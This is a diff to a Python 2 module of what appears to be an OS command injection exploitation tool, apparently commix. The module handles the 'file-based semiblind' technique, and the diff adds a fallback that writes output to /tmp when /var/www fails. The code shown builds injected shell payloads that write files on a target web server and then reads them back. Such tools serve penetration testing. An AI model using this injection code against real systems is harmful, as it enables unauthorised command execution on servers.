@@ -31,6 +31,8 @@ from src.utils import settings
 from src.core.requests import headers
 from src.core.requests import parameters
 
+from src.core.injections.semiblind_based.techniques import tempfile_based
+
 """
  The "File-based" technique on Semiblind-based OS Command Injection.
 """
@@ -42,7 +44,7 @@ def exploitation(url,delay,filename):
   no_result = True
   is_encoded= False
   injection_type = "Semiblind-based Command Injection"
-  technique = "file-based semiblind-based injection technique"
+  technique = "file-based semiblind injection technique"
   
   sys.stdout.write( "(*) Testing the "+ technique +"... ")
   sys.stdout.flush()
@@ -79,9 +81,10 @@ def exploitation(url,delay,filename):
 	    B64_ENC_TAG = TAG
 	    B64_DEC_TRICK = ""
 	    
-	  # The output file for boolean-based injection technique.
+	  # The output file for file-based injection technique.
 	  OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
-	    
+	  
+	  sys.stdout.write( "\n(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on '/var/www/'... ")
 	  try:
 	    payload = (seperator + " " +
 		      "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + " > " + OUTPUT_TEXTFILE + ")"
@@ -219,16 +222,15 @@ def exploitation(url,delay,filename):
 	      try:
 		output = urllib2.urlopen(output)
 		html_data = output.read()
-		  
+	      
+	      # If failed, use tmp directory
 	      except urllib2.HTTPError, e:
 		  if e.getcode() == 404:
-		    print colors.RED + "\n(x) Error: The requested URL (" + output +") was not found on this server (404)." + colors.RESET
-		    check_next = raw_input("(*) Do you want to continue? [Y/n] > ")
-		    if check_next == "Y" or check_next == "y" :
-		      pass
-		    else:
-		      os._exit(0)
-		  
+		    print colors.RED + "\n(x) Error: Unable to upload the '"+ OUTPUT_TEXTFILE +"' on '/var/www'." + colors.RESET
+		    tmp_file = "/tmp/"
+		    sys.stdout.write("(*) Trying to upload the "+ OUTPUT_TEXTFILE +" on temp (" + tmp_file + ") directory ...\n")
+		    tempfile_based.exploitation(url,delay,filename,tmp_file)     
+		      
 	      except urllib2.URLError, e:
 		  print colors.RED + "(x) Error: The host seems to be down!" + colors.RESET
 		  sys.exit(0)
